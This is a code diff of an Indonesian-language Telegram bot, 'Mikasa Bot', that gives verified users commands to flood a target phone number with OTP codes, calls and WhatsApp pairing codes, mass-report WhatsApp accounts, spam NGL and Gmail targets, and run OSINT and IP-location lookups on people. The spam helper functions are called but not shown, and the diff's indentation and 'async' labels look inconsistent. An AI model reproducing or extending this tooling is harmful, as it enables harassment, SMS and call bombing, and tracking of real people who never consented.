+    self.send_text(chat_id, "𝙏𝙊𝙊𝙇𝙎: 𝐎𝐒𝐈𝐍𝐓\n\n𝙋𝙞𝙡𝙞𝙝:\n/osintnomor +628xxxxxxxxx\n/osintusername username\n/osintip 8.8.8.8\n/osintdomain google.com", "Markdown")
+            
+# ===================== ASYNC METHODS (UNTUK TELEGRAM BOT POLLING) =====================
+
+ def is_verified(self, user_id):
+    user_id = str(user_id)
+    if user_id not in self.users:
+        return False
+    return self.users[user_id].get('status') == 'active'
+
+ def start(self, update, context):
+    user_id = str(update.effective_user.id)
+    first_name = update.effective_user.first_name or "User"
+    
+    uid = get_uid()
+    status, user_data = cek_uid(uid)
+    
+    if status is None:
+        update.message.reply_text("❌ *Gagal terhubung ke server lisensi.*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    if user_id in self.users:
+        user_data_local = self.users[user_id]
+        if user_data_local.get('status') == 'active':
+            self.send_welcome(update, context, first_name)
+            return
+        else:
+            update.message.reply_text(
+                f"⏳ *Akun Belum Aktif*\n\n"
+                f"👤 Nama: {user_data_local.get('nama', 'User')}\n\n"
+                f"Menunggu verifikasi dari admin.",
+                parse_mode=ParseMode.MARKDOWN
             )
             return
-        
-        if user_id in self.users:
-            user_data_local = self.users[user_id]
-            if user_data_local.get('status') == 'active':
-                await self.send_welcome(update, context, first_name)
-                return
-            else:
-                await update.message.reply_text(
-                    f"⏳ *Akun Belum Aktif*\n\n"
-                    f"👤 Nama: {user_data_local.get('nama', 'User')}\n\n"
-                    f"Menunggu verifikasi dari admin."
-                )
-                return
-        
-        await update.message.reply_text(
-            f"🔐 *REGISTRASI DIPERLUKAN*\n\n"
-            f"Gunakan: `/register nama_anda`\n"
-            f"Contoh: `/register Rullzzz_06`"
-        )
-        context.user_data['state'] = 'waiting_register'
     
-   async def send_welcome(self, update: Update, context: ContextTypes.DEFAULT_TYPE, name):
+    update.message.reply_text(
+        f"🔐 *REGISTRASI DIPERLUKAN*\n\n"
+        f"Gunakan: `/register nama_anda`\n"
+        f"Contoh: `/register Rullzzz_06`",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+ def send_welcome(self, update, context, name):
     keyboard = [
         [InlineKeyboardButton("〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", callback_data="menu_spam")],
         [InlineKeyboardButton("〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", callback_data="menu_osint")],
@@ -6608,193 +7146,197 @@ class MikasaBot:
     caption = (
         f"𝙈𝙄𝙆𝘼𝙎𝘼 𝘽𝙊𝙏 𝙈𝘿\n"
         f"𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
-        f"𝙷𝚊𝚕𝚘 {name}! 𝙱𝚘𝚝 𝚒𝚗𝚒 𝚍𝚒 𝙱𝚞𝚊𝚝 𝙾𝚕𝚎𝚑"
-        f"𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔, 𝙳𝚊𝚗 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙼𝚎𝚖𝚒𝚕𝚒𝚑 𝐊𝐚𝐭𝐞𝐠𝐨𝐫𝐲"
+        f"𝙷𝚊𝚕𝚘 {name}! 𝙱𝚘𝚝 𝚒𝚗𝚒 𝚍𝚒 𝙱𝚞𝚊𝚝 𝙾𝚕𝚎𝚑\n"
+        f"𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔, 𝙳𝚊𝚗 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙼𝚎𝚖𝚒𝚕𝚒𝚑 𝐊𝐚𝐭𝐞𝐠𝐨𝐫𝐲\n"
         f"𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝚒𝚗𝚒 😈👇"
     )
     
     try:
-        await update.message.reply_photo(
+        update.message.reply_photo(
             photo=BANNER_URL,
             caption=caption,
             reply_markup=reply_markup,
             parse_mode=ParseMode.MARKDOWN
         )
     except:
-        await update.message.reply_text(
+        update.message.reply_text(
             caption,
             reply_markup=reply_markup,
             parse_mode=ParseMode.MARKDOWN
         )
-    
-   async def register(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = str(update.effective_user.id)
-        username = update.effective_user.username or "Unknown"
-        
-        args = context.args
-        if not args:
-            await update.message.reply_text(
-                f"❌ *Format Salah!*\n\n"
-                f"Gunakan: `/register nama_anda`"
-            )
-            return
-        
-        nama = ' '.join(args).strip()
-        
-        if len(nama) < 3:
-            await update.message.reply_text("❌ Nama minimal 3 karakter!")
-            return
-        if len(nama) > 30:
-            await update.message.reply_text("❌ Nama maksimal 30 karakter!")
-            return
-        if not re.match(r'^[a-zA-Z0-9_.\s]+$', nama):
-            await update.message.reply_text("❌ Nama hanya boleh huruf, angka, underscore, titik, dan spasi!")
-            return
-        
-        if user_id in self.users:
-            await update.message.reply_text(
-                f"⚠️ *Kamu sudah terdaftar!*\n\n"
-                f"Status: {'Aktif' if self.users[user_id].get('status') == 'active' else 'Pending'}"
-            )
-            return
-        
-        uid = get_uid()
-        self.users[user_id] = {
-            "id": user_id,
-            "username": username,
-            "nama": nama,
-            "uid": uid,
-            "status": "pending",
-            "registered_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        }
-        save_users(self.users)
-        
-        await self.notify_admin(
-            f"🔑 *REGISTRASI USER BARU*\n\n"
-            f"🆔 User ID: `{user_id}`\n"
-            f"👤 Username: @{username}\n"
-            f"👤 Nama: {nama}\n"
-            f"🆔 UID: `{uid}`\n"
-            f"🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
-            f"Verifikasi: `/verify {user_id}`"
-        )
-        
-        await update.message.reply_text(
-            f"✅ *Registrasi Berhasil!*\n\n"
-            f"👤 Nama: {nama}\n"
-            f"⏳ Menunggu Verifikasi Admin"
-        )
-    
-   async def verify(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = str(update.effective_user.id)
-        
-        if int(user_id) != ADMIN_ID:
-            await update.message.reply_text("❌ *Akses Ditolak!* Hanya admin.")
-            return
-        
-        args = context.args
-        if not args:
-            await update.message.reply_text(
-                f"❌ *Format Salah!*\n\n"
-                f"Gunakan: `/verify user_id`"
-            )
-            return
-        
-        target_id = args[0].strip()
-        
-        if target_id not in self.users:
-            await update.message.reply_text(f"❌ User ID `{target_id}` tidak ditemukan!")
-            return
-        
-        self.users[target_id]['status'] = 'active'
-        save_users(self.users)
-        
-        await update.message.reply_text(
-            f"✅ *User Berhasil Diverifikasi!*\n\n"
-            f"🆔 ID: `{target_id}`\n"
-            f"👤 Nama: {self.users[target_id].get('nama', 'Unknown')}"
-        )
-        
-        try:
-            await context.bot.send_message(
-                chat_id=int(target_id),
-                text=f"✅ *Akun Diverifikasi!*\n\n"
-                     f"Gunakan /start untuk memulai."
-            )
-        except:
-            pass
-    
-   async def notify_admin(self, message, parse_mode="Markdown"):
-        try:
-            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
-            payload = {"chat_id": ADMIN_ID, "text": message, "parse_mode": parse_mode}
-            requests.post(url, json=payload, timeout=10)
-        except:
-            pass
-    
-   def is_verified(self, user_id):
-        user_id = str(user_id)
-        if user_id not in self.users:
-            return False
-        return self.users[user_id].get('status') == 'active'
-    
-    # ===================== COMMAND HANDLERS =====================
-    
-   async def cmd_spam_otp(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = str(update.effective_user.id)
-        if not self.is_verified(user_id):
-            await update.message.reply_text("❌ *Akses Ditolak!*")
-            return
-        
-        args = context.args
-        if not args:
-            await update.message.reply_photo(
-                photo=SPAM_OTP_IMG,
-                caption=(
-                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐎𝐓𝐏\n"
-                    f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
-                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙉𝙤𝙢𝙤𝙧:\n"
-                    f"/spamotp 628xxxxxxxxx"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-            return
-        
-        nomor = args[0].strip()
-        if nomor.startswith('0'):
-            nomor = nomor
-        elif nomor.startswith('62'):
-            nomor = '0' + nomor[2:]
-        elif nomor.startswith('+62'):
-            nomor = '0' + nomor[3:]
-        
-        await update.message.reply_text(format_loading("Mengirim Spam OTP"))
-        
-        try:
-            results = run_spam_otp(nomor)
-            success = sum(1 for r in results if '✅' in r)
-            failed = len(results) - success
-            
-            detail = "\n".join(results)
-            await update.message.reply_text(
-                format_success(
-                    "𝐒𝐏𝐀𝐌 𝐎𝐓𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    "KETIK /start FOR BACK\n",
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        except Exception as e:
-            await update.message.reply_text(format_error(str(e)))
-    
-   async def cmd_spam_call(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+ def register(self, update, context):
     user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
+    username = update.effective_user.username or "Unknown"
+    args = context.args
+    
+    if not args:
+        update.message.reply_text(
+            f"❌ *Format Salah!*\n\nGunakan: `/register nama_anda`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nama = ' '.join(args).strip()
+    
+    if len(nama) < 3:
+        update.message.reply_text("❌ Nama minimal 3 karakter!", parse_mode=ParseMode.MARKDOWN)
+        return
+    if len(nama) > 30:
+        update.message.reply_text("❌ Nama maksimal 30 karakter!", parse_mode=ParseMode.MARKDOWN)
+        return
+    if not re.match(r'^[a-zA-Z0-9_.\s]+$', nama):
+        update.message.reply_text("❌ Nama hanya boleh huruf, angka, underscore, titik, dan spasi!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    if user_id in self.users:
+        update.message.reply_text(
+            f"⚠️ *Kamu sudah terdaftar!*\n\n"
+            f"Status: {'Aktif' if self.users[user_id].get('status') == 'active' else 'Pending'}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    uid = get_uid()
+    self.users[user_id] = {
+        "id": user_id,
+        "username": username,
+        "nama": nama,
+        "uid": uid,
+        "status": "pending",
+        "registered_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    }
+    save_users(self.users)
+    
+    self.notify_admin_async(
+        f"🔑 *REGISTRASI USER BARU*\n\n"
+        f"🆔 User ID: `{user_id}`\n"
+        f"👤 Username: @{username}\n"
+        f"👤 Nama: {nama}\n"
+        f"🆔 UID: `{uid}`\n"
+        f"🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
+        f"Verifikasi: `/verify {user_id}`"
+    )
+    
+    update.message.reply_text(
+        f"✅ *Registrasi Berhasil!*\n\n"
+        f"👤 Nama: {nama}\n"
+        f"⏳ Menunggu Verifikasi Admin",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+ def verify(self, update, context):
+    user_id = str(update.effective_user.id)
+    
+    if int(user_id) != ADMIN_ID:
+        update.message.reply_text("❌ *Akses Ditolak!* Hanya admin.", parse_mode=ParseMode.MARKDOWN)
         return
     
     args = context.args
     if not args:
-        await update.message.reply_photo(
+        update.message.reply_text(
+            f"❌ *Format Salah!*\n\nGunakan: `/verify user_id`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    target_id = args[0].strip()
+    
+    if target_id not in self.users:
+        update.message.reply_text(f"❌ User ID `{target_id}` tidak ditemukan!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    self.users[target_id]['status'] = 'active'
+    save_users(self.users)
+    
+    update.message.reply_text(
+        f"✅ *User Berhasil Diverifikasi!*\n\n"
+        f"🆔 ID: `{target_id}`\n"
+        f"👤 Nama: {self.users[target_id].get('nama', 'Unknown')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    try:
+        context.bot.send_message(
+            chat_id=int(target_id),
+            text=f"✅ *Akun Diverifikasi!*\n\nGunakan /start untuk memulai.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except:
+        pass
+
+ def notify_admin_async(self, message, parse_mode="Markdown"):
+    try:
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        payload = {"chat_id": ADMIN_ID, "text": message, "parse_mode": parse_mode}
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
+# ===================== ASYNC COMMAND HANDLERS =====================
+
+ def cmd_spam_otp(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=SPAM_OTP_IMG,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐎𝐓𝐏\n"
+                f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙉𝙤𝙢𝙤𝙧:\n"
+                f"/spamotp 628xxxxxxxxx"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nomor = args[0].strip()
+    if nomor.startswith('0'):
+        nomor = nomor
+    elif nomor.startswith('62'):
+        nomor = '0' + nomor[2:]
+    elif nomor.startswith('+62'):
+        nomor = '0' + nomor[3:]
+    
+    update.message.reply_text(format_loading("Mengirim Spam OTP"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        results = run_spam_otp(nomor)
+        success = sum(1 for r in results if '✅' in r)
+        failed = len(results) - success
+        
+        detail = "\n".join(results[:20])
+        if len(results) > 20:
+            detail += f"\n... dan {len(results)-20} lainnya"
+        
+        update.message.reply_text(
+            format_success(
+                "𝐒𝐏𝐀𝐌 𝐎𝐓𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"📱 Target: `{nomor}`\n"
+                f"✅ Berhasil: {success}\n"
+                f"❌ Gagal: {failed}\n"
+                f"📋 Total API: {len(results)}\n\n"
+                f"{detail}"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_call(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
             photo=IMAGE,
             caption=(
                 f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋\n"
@@ -6807,39 +7349,1171 @@ class MikasaBot:
     
     nomor = args[0].strip()
     if not nomor.startswith('62'):
-        await update.message.reply_text("❌ Nomor harus diawali 62!")
+        update.message.reply_text("❌ Nomor harus diawali 62!", parse_mode=ParseMode.MARKDOWN)
         return
     
-    await update.message.reply_text(format_loading("Mengirim Spam Call"))
+    update.message.reply_text(format_loading("Mengirim Spam Call"), parse_mode=ParseMode.MARKDOWN)
     
     try:
         success = run_spam_call(nomor)
-        await update.message.reply_text(
+        update.message.reply_text(
             format_success(
                 "𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                "KETIK /start FOR BACK",             
+                f"📱 Target: `{nomor}`\n✅ Berhasil: {success}/10"
             ),
             parse_mode=ParseMode.MARKDOWN
         )
     except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-        
-   async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_pair(self, update, context):
     user_id = str(update.effective_user.id)
     if not self.is_verified(user_id):
-        await query.message.reply_text("❌ *Akses Ditolak!*")
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
         return
     
+    args = context.args
+    if not args:
+        update.message.reply_text(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆\n"
+            f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+            f"/spampair 628xxxxxxxxx",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nomor = args[0].strip()
+    if nomor.startswith('0'):
+        nomor = '62' + nomor[1:]
+    elif nomor.startswith('+62'):
+        nomor = nomor[1:]
+    
+    update.message.reply_text(format_loading("Mengirim Kode Pairing"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        success = run_spam_pairing(nomor)
+        update.message.reply_text(
+            format_success(
+                "𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"📱 Target: `{nomor}`\n✅ Berhasil: {success}/5"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_repwa(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐖𝐀\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/spamrepwa +628xxxxxxxxx"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nomor = args[0].strip()
+    update.message.reply_text(format_loading("Mengirim Spam Report"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        results = run_spam_report(nomor)
+        detail = "\n".join(results)
+        update.message.reply_text(
+            format_success(
+                "𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"📱 Target: `{nomor}`\n\n📋 Detail:\n{detail}"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_ngl(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐍𝐆𝐋\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/spamngl username"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    username = args[0].strip()
+    update.message.reply_text(format_loading("Mengirim Spam NGL"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        success = run_spam_ngl(username)
+        update.message.reply_text(
+            format_success(
+                "𝐒𝐏𝐀𝐌 𝐍𝐆𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"👤 Target: `{username}`\n✅ Berhasil: {success}/20"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_gmail(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋\n"
+                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
+                f"/spamgmail target@gmail.com\n"
+                f"/spamgmail target@gmail.com | pesan yang ingin dikirim\n\n"
+                f"📌 Gunakan tanda | sebagai pemisah antara email dan pesan"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    full_text = ' '.join(args)
+    if '|' in full_text:
+        parts = full_text.split('|', 1)
+        target_email = parts[0].strip()
+        custom_message = parts[1].strip() if len(parts) > 1 else None
+    else:
+        target_email = full_text.strip()
+        custom_message = None
+    
+    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target_email):
+        update.message.reply_text("❌ Format email tidak valid!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    if custom_message and len(custom_message) > 4000:
+        update.message.reply_text("❌ Pesan terlalu panjang! Maksimal 4000 karakter.", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading(f"Mengirim Spam Email ke {target_email}"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        success, total = run_spam_gmail(target_email, custom_message)
+        msg = format_success(
+            "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"📧 Target: `{target_email}`\n✅ Berhasil: {success}/{total} sender"
+        )
+        if custom_message:
+            msg += f"\n📝 Pesan: {custom_message[:50]}..."
+        update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_osint(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_photo(
+        photo=IMAGE,
+        caption=(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐎𝐒𝐈𝐍𝐓\n"
+            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
+            f"𝙋𝙞𝙡𝙞𝙝:\n"
+            f"/osintnomor +628xxxxxxxxx\n"
+            f"/osintusername username\n"
+            f"/osintip 8.8.8.8\n"
+            f"/osintdomain google.com"
+        ),
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+ def cmd_osint_nomor(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption="Gunakan: /osintnomor +628xxxxxxxxx",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nomor = args[0].strip()
+    update.message.reply_text(format_loading("Melakukan OSINT Nomor"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        info = osint_nomor(nomor)
+        if info:
+            update.message.reply_text(
+                format_success(
+                    "𝐎𝐒𝐈𝐍𝐓 𝐍𝐎𝐌𝐎𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"📱 Nomor: `{info['nomor']}`\n"
+                    f"✅ Valid: {info['valid']}\n"
+                    f"📍 Negara: {info['negara']}\n"
+                    f"📱 Operator: {info['operator']}\n"
+                    f"🌐 Timezone: {info['timezone']}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text("❌ Gagal OSINT", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_osint_username(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption="Gunakan: /osintusername username",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    username = args[0].strip()
+    update.message.reply_text(format_loading("Melakukan OSINT Username"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        found = osint_username(username)
+        if found:
+            msg = f"𝙊𝙎𝙄𝙉𝙏 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 𝙎𝙀𝙇𝙀𝙎𝘼𝙄✅\n\n"
+            for name, url in found[:20]:
+                msg += f"✅ {name}: {url}\n"
+            update.message.reply_text(msg)
+        else:
+            update.message.reply_text(f"❌ Username `{username}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_osint_ip(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption="Gunakan: /osintip 8.8.8.8",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    ip = args[0].strip()
+    update.message.reply_text(format_loading("Melakukan OSINT IP"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = osint_ip(ip)
+        if data and data.get('status') == 'success':
+            update.message.reply_text(
+                format_success(
+                    "𝐎𝐒𝐈𝐍𝐓 𝐈𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🌍 IP: `{data.get('query')}`\n"
+                    f"📍 Negara: {data.get('country')}\n"
+                    f"🏙️ Kota: {data.get('city')}\n"
+                    f"📌 ISP: {data.get('isp')}\n"
+                    f"🌐 Timezone: {data.get('timezone')}\n"
+                    f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat')},{data.get('lon')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text("❌ Gagal OSINT IP", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_osint_domain(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption="Gunakan: /osintdomain google.com",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    domain = args[0].strip()
+    update.message.reply_text(format_loading("Melakukan OSINT Domain"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = osint_domain(domain)
+        if data:
+            whois = data.get('whois', {})
+            update.message.reply_text(
+                format_success(
+                    "𝐎𝐒𝐈𝐍𝐓 𝐃𝐎𝐌𝐀𝐈𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🌍 Domain: `{data['domain']}`\n"
+                    f"📌 IP: `{data['ip']}`\n"
+                    f"📋 Registrar: {whois.get('registrar', 'N/A')}\n"
+                    f"📅 Created: {whois.get('creation_date', 'N/A')}\n"
+                    f"⏰ Expires: {whois.get('expiration_date', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Domain `{domain}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_ip_tracker(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/iptracker 8.8.8.8"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    ip = args[0].strip()
+    update.message.reply_text(format_loading("Melacak IP"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_ip_tracker(ip)
+        if data and data.get('status') == 'success':
+            update.message.reply_text(
+                format_success(
+                    "𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"━━━ *INFORMASI IP* ━━━\n"
+                    f"🌍 IP: `{data.get('query')}`\n"
+                    f"📍 Negara: {data.get('country')} ({data.get('countryCode')})\n"
+                    f"🗺️ Region: {data.get('regionName')}\n"
+                    f"🏙️ Kota: {data.get('city')}\n"
+                    f"📮 Kode Pos: {data.get('zip')}\n"
+                    f"📌 ISP: {data.get('isp')}\n"
+                    f"🏢 Organisasi: {data.get('org')}\n"
+                    f"🌐 Timezone: {data.get('timezone')}\n"
+                    f"📱 Mobile: {'Ya' if data.get('mobile') else 'Tidak'}\n"
+                    f"🔒 Proxy/VPN: {'Ya' if data.get('proxy') else 'Tidak'}\n"
